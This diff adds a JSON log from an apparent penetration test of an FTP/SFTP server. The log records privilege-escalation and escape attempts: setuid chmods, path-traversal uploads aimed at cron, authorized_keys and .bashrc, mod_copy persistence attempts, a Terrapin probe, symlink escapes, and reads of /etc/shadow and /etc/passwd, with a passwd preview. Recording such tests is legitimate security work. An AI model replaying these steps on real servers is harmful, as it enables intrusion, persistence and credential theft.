@@ -1,0 +1,150 @@
+{
+  "attack": "privesc_cve",
+  "date": "2026-02-14T12:43:39.246808",
+  "tests": {
+    "site_chmod": {
+      "World-writable dir": {
+        "cmd": "SITE CHMOD 777 /home/ftptest/upload",
+        "response": "200 SITE CHMOD command successful",
+        "success": true
+      },
+      "setuid bit on dir": {
+        "cmd": "SITE CHMOD 4755 /home/ftptest/upload",
+        "response": "200 SITE CHMOD command successful",
+        "success": true
+      },
+      "setuid+setgid": {
+        "cmd": "SITE CHMOD 6755 /home/ftptest/upload",
+        "response": "200 SITE CHMOD command successful",
+        "success": true
+      },
+      "Sticky bit on /tmp (already set)": {
+        "cmd": "SITE CHMOD 1777 /tmp",
+        "response": "550 CHMOD 1777 /tmp: Operation not permitted",
+        "success": false
+      },
+      "setuid on /etc/passwd copy": {
+        "cmd": "SITE CHMOD 4777 /tmp/exfil_passwd",
+        "response": "200 SITE CHMOD command successful",
+        "success": true,
+        "verified_mode": "0o104777"
+      },
+      "chmod /etc/passwd (should fail)": {
+        "cmd": "SITE CHMOD 777 /etc/passwd",
+        "response": "550 CHMOD 777 /etc/passwd: Operation not permitted",
+        "success": false
+      },
+      "chmod /etc/shadow (should fail)": {
+        "cmd": "SITE CHMOD 777 /etc/shadow",
+        "response": "550 CHMOD 777 /etc/shadow: Operation not permitted",
+        "success": false
+      }
+    },
+    "stor_traversal": {
+      "Traversal via ../": {
+        "dest": "../../../tmp/stor_traversal_test",
+        "response": "150 Opening ASCII mode data connection for ../../../tmp/stor_traversal_test\r\n226 Transfer complete\r\n",
+        "success": true
+      },
+      "Absolute path /tmp/": {
+        "dest": "/tmp/stor_absolute_test",
+        "response": "150 Opening ASCII mode data connection for /tmp/stor_absolute_test\r\n226 Transfer complete\r\n",
+        "success": true
+      },
+      "Cron injection": {
+        "dest": "/etc/cron.d/proftpd_inject",
+        "response": "550 /etc/cron.d/proftpd_inject: Permission denied\r\n",
+        "success": false
+      },
+      "authorized_keys": {
+        "dest": "/home/ftptest/.ssh/authorized_keys",
+        "response": "550 /home/ftptest/.ssh/authorized_keys: No such file or directory\r\n",
+        "success": false
+      },
+      "User crontab": {
+        "dest": "/var/spool/cron/crontabs/ftptest",
+        "response": "550 /var/spool/cron/crontabs/ftptest: Permission denied\r\n",
+        "success": false
+      },
+      "Cross-user .bashrc": {
+        "dest": "/home/ftptest/../svc/.bashrc",
+        "response": "550 /home/ftptest/../svc/.bashrc: Permission denied\r\n",
+        "success": false
+      }
+    },
+    "persistence_modcopy": {
+      "User crontab via mod_copy": {
+        "cpfr": "350 File or directory exists, ready for destination name",
+        "cpto": "550 CPTO: Permission denied",
+        "success": false
+      },
+      "System cron.d via mod_copy": {
+        "cpfr": "350 File or directory exists, ready for destination name",
+        "cpto": "550 CPTO: Permission denied",
+        "success": false
+      },
+      "authorized_keys via mod_copy (if .ssh exists)": {
+        "cpfr": "350 File or directory exists, ready for destination name",
+        "cpto": "550 CPTO: No such file or directory",
+        "success": false
+      }
+    },
+    "cve_2023_48795_terrapin": {
+      "banner": "SSH-2.0-mod_sftp\r\n\u0000\u0000\u0005\u001c\b\u0014\u000e\ufffd\ufffd\ufffd\u001aY\ufffd9\ufffd?\u0019\ufffd'\ufffd\ufffd\ufffd\u0000\u0000\u0001jcurve448-sha512,curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp521,ecdh-sha2-nistp384,ecdh-sha2-nistp256,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group14-sha256,di",
+      "kex_init_bytes": 1074,
+      "kex_hex_prefix": "666669652d68656c6c6d616e2d67726f75702d65786368616e67652d73686132",
+      "cipher_findings": {
+        "chacha20-poly1305@openssh.com": true,
+        "aes128-cbc": true,
+        "aes256-cbc": true
+      },
+      "potentially_vulnerable": true
+    },
+    "symlink_escape": {
+      "Symlink to /": {
+        "symlink_response": "200 SITE SYMLINK command successful",
+        "cwd_response": "250 CWD command successful",
+        "pwd_response": "257 \"/\" is the current directory",
+        "escape_possible": true
+      },
+      "Symlink to /etc": {
+        "symlink_response": "200 SITE SYMLINK command successful",
+        "cwd_response": "250 CWD command successful",
+        "pwd_response": "257 \"/etc\" is the current directory",
+        "escape_possible": true
+      },
+      "Symlink to /root": {
+        "symlink_response": "200 SITE SYMLINK command successful",
+        "cwd_response": "550 /home/ftptest/root_home_escape: Permission denied",
+        "pwd_response": "257 \"/etc\" is the current directory",
+        "escape_possible": false
+      }
+    },
+    "retr_via_symlink": {
+      "RETR via shadow symlink": {
+        "path": "/home/ftptest/shadow_link",
+        "content_len": 0,
+        "preview": "",
+        "success": false
+      },
+      "RETR via / symlink \u2192 /etc/shadow": {
+        "path": "/home/ftptest/root_escape/etc/shadow",
+        "content_len": 0,
+        "preview": "",
+        "success": false
+      },
+      "RETR via /etc symlink \u2192 shadow": {
+        "path": "/home/ftptest/etc_escape/shadow",
+        "content_len": 0,
+        "preview": "",
+        "success": false
+      },
+      "RETR via / symlink \u2192 /etc/passwd": {
+        "path": "/home/ftptest/root_escape/etc/passwd",
+        "content_len": 3535,
+        "preview": "root:x:0:0:root:/root:/usr/bin/zsh\r\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\r\nbin:x:2:2:bin:/",
+        "success": true
+      }
+    }
+  }
+}
